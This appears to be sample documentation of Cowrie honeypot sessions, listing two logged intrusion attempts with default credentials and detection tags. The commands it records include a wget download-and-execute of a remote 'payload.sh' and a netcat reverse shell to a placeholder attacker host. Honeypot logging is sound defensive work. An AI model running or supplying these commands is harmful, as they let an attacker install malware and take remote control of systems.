
# Sample Cowrie Sessions

## Session 2025-05-08-01
**IP:** 192.168.1.101  
**User:** root  
**Password:** 123456  
**Commands:**  
- wget http://maliciousdomain.net/payload.sh  
- chmod +x payload.sh && ./payload.sh  
**Outcome:** Logged and tagged as `MALWARE_UPLOAD` and `COMMAND_EXECUTION`.

## Session 2025-05-10-02
**IP:** 172.16.0.54  
**User:** admin  
**Password:** admin123  
**Commands:**  
- nc -e /bin/sh attackerIP 4444  
**Outcome:** Tagged as `C2 Reverse_Shell_Attempt`
